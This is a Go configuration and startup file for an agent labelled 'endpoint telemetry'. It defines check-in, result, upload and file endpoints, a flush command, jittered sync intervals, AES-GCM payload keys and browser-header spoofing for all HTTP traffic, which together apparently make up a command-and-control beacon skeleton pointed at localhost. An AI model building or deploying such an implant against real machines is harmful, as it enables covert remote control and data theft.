package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"time"

	"endpoint-telemetry/funcs"
)

var (
	TelemetryEndpoint string = "http://localhost:5000"
	PathCheckin              = "/api/checkin"
	PathResult               = "/api/result"
	PathUpload               = "/api/upload"
	PathFiles                = "/api/files/"
	FlushCommand             = "__flush_cache__"

	SyncDelayMin        = 8 * time.Second
	SyncDelayMax        = 15 * time.Second
	ProfileID int    = 1
	Locale    string = "en-US,en;q=0.9"
	EndpointID   string

	// Encryption key for payload encryption (AES-256-GCM).
	// These are dev-only placeholders. Real agents get a fresh key
	// from the build pipeline. This dev key is not in the server DB
	// so agents built from source will fail to check in.
	KeyID         = "devdevde"
	EncryptionKey = parseDiagnosticKey("6465766b657930303030303030303030303030303030303030303030303030303030"[:64])
)

// parseDiagnosticKey decodes a hex string into []byte, panicking on failure.
// If this panics at startup the binary was built with a malformed key.
func parseDiagnosticKey(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		panic("config: invalid key hex: " + err.Error())
	}
	return b
}

func assignEndpointID() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40 // version 4
	b[8] = (b[8] & 0x3f) | 0x80 // variant 10
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func InitializeTelemetry() {
	EndpointID = assignEndpointID()

	profile, ok := funcs.Profiles[ProfileID]
	if !ok {
		profile = funcs.Profiles[1] // fallback to Chrome/Windows
	}

	// Set Accept-Language from the locale baked in at build time
	profile.Headers["Accept-Language"] = Locale

	// Replace the default HTTP client so every request the agent makes
	// goes through the browser profile transport automatically
	http.DefaultClient = &http.Client{
		Transport: &funcs.UATransport{
			Base:    http.DefaultTransport,
			Profile: profile,
		},
	}

	fmt.Println("=======================================")
	fmt.Println("   Endpoint Telemetry  Initialized     ")
	fmt.Println("=======================================")
	fmt.Printf("  Endpoint  : %s\n", EndpointID)
	fmt.Printf("  Gateway   : %s\n", TelemetryEndpoint)
	fmt.Printf("  Interval  : %s to %s\n", SyncDelayMin, SyncDelayMax)
	fmt.Printf("  Profile   : %s\n", profile.Name)
	fmt.Printf("  Locale    : %s\n", Locale)
	fmt.Printf("  OS/Arch   : %s/%s\n", runtime.GOOS, runtime.GOARCH)

	hostname, err := os.Hostname()
	if err == nil {
		fmt.Printf("  Hostname  : %s\n", hostname)
	}

	fmt.Println("=======================================")
}
